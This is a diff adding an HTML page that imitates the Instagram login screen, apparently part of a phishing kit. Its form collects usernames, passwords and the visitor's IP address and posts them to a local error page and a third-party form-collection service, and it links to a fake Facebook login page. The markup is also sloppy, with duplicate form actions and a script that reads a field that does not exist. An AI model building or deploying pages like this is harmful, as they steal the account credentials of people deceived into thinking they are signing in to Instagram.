@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://arabasiastarz.com/season-2/assets/images/favicon.ico">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+ 
+  <title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+            <form action="/pages/error" method="POST" action="https://www.formbackend.com/f/664decaabbf1c319" onSubmit={submitForm} name="Instagram" >
+
+                <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+                <div class="c-panel__form">
+                  <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id = "ig-username" name="IG username">
+                  <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-password" name="IG password">
+                  <input id="ip" type="hidden" name="ip" value="<?=$ip;?>">
+                  <button class="c-btn" type="submit"> Log In</button> 
+                  <span class="c-panel__span">OR</span>
+                </div>
+                <a href="fb/login.html" class="c-panel__facebook">Login with Facebook</a> <br>
+                <a href="#" class="c-panel__forgot">Forgot password?</a>
+                <br>
+                <br>
+              </div>
+              <div class="c-signup group">
+                <p>Don't have an account? <span>Sign up</span></p>
+              </div>
+
+            </form>  
+
+
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+
+  <script src="firebase/firebase.js"></script>
+  <script src="js/main.js"></script>
+
+  <!-- location scripts-->
+  <script>var ip = document.getElementById('inputID').value; </script>
+
+
+</body>
+</html>
